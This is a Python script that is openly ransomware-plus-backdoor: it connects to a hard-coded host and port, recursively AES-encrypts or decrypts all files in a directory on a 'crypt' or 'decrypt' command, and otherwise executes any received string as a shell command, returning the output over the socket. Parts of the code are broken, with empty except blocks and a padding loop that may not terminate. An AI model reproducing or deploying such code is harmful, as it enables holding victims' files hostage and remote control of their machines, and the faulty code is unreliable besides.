import socket
import subprocess
import os
from Crypto.Cipher import AES
import hashlib


def decrypt():
    # Decrypting data
    global path
    
    password = '0101010001101000011010010111001100100000011010010111001100100000010100110101000001010010010011110100111101010100'.encode()
    key = hashlib.sha256(password).digest()
    mode = AES.MODE_CBC
    IV = 16 * '\x00'
    cipher = AES.new(key,mode,IV)

    def pad_message(path):
        while len(path) % 16 != 0:
                path = path  + b'\x8a\xfe\xa7aY}\xa3It=\xc3\xccT\xc8\xd8\xba\x9e\xf8\xec&\xf0'
        return path
    
    with open(path, 'rb') as f:
        orig_file = f.read()
    padded_message = pad_message(orig_file)
    encrypt_message = cipher.decrypt(padded_message)
    with open(path, 'wb') as e:
        e.write(encrypt_message)


def decrypt_dir(dir):
    global path
    # We iterate over all subdirectories in the specified directory
    try:
        try:
            for name in os.listdir(dir):
                path = os.path.join(dir, name)
                #print(path)
                if os.path.isfile(path):
                    #print(path)
                    decrypt()
                else:
                    decrypt_dir(path)
        except NotADirectoryError as msg:
            #root = os.chdir(path)
            #print(str(msg))

                
    except FileNotFoundError as f:
        #print(str(f))


def crypt():
    # Encrypt data
    global path
    
    password = '0101010001101000011010010111001100100000011010010111001100100000010100110101000001010010010011110100111101010100'.encode()  
    key = hashlib.sha256(password).digest()
    mode = AES.MODE_CBC
    IV = 16 * '\x00'
    cipher = AES.new(key,mode,IV)

    def pad_message(path):
        while len(path) % 16 != 0:
                path = path  + b'\x8a\xfe\xa7aY}\xa3It=\xc3\xccT\xc8\xd8\xba\x9e\xf8\xec&\xf0'
        return path
    with open(path, 'rb') as f:
        orig_file = f.read()

    padded_message = pad_message(orig_file)
    encrypt_message = cipher.encrypt(padded_message)

    with open(path, 'wb') as e:
        e.write(encrypt_message)
    


def walking_dir(dir):
    global path
    # We iterate over all subdirectories in the specified directory
    try:
        try:
            for name in os.listdir(dir):
                path = os.path.join(dir, name)
                #print(path)
                if os.path.isfile(path):
                    #print(path)
                    crypt()
                else:
                    walking_dir(path)
        except NotADirectoryError as msg:
            #root = os.chdir(path)
            print(str(msg))     
    except FileNotFoundError as f:
        print(str(f))


def socket_create():
    try:
        global host
        global port
        global s

        host = '192.168.1.6'
        port = 19876
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print('Error starting' + str(msg))

def connect_socket():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print('Error connection' + str(msg))

def recive_command():
    while True:
        data = s.recv(1024)
        if data.decode('utf-8') == 'crypt':
            walking_dir('/home/samsapi01/My_scripts/nas') # Specify directory
        if data.decode('utf-8') == 'decrypt':
            decrypt_dir('/home/samsapi01/My_scripts/nas') # Specify directory
        
        # Getting other commands
        if data[:2].decode('utf-8') == 'cd':
            try:
                os.chdir(data[3:].decode('utf-8'))
            except:
                pass
        if data[:].decode('utf-8') == 'quit':
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode('utf-8'),shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, 'utf-8')
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                #print(output_str)
            except:
                output_str = "Command not recongnized" + '\n'
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
    s.close()


def main():
    global s

    try:
        socket_create()
        connect_socket()
        recive_command()
    except:
        print('Error main')
    s.close()
    main()
main()



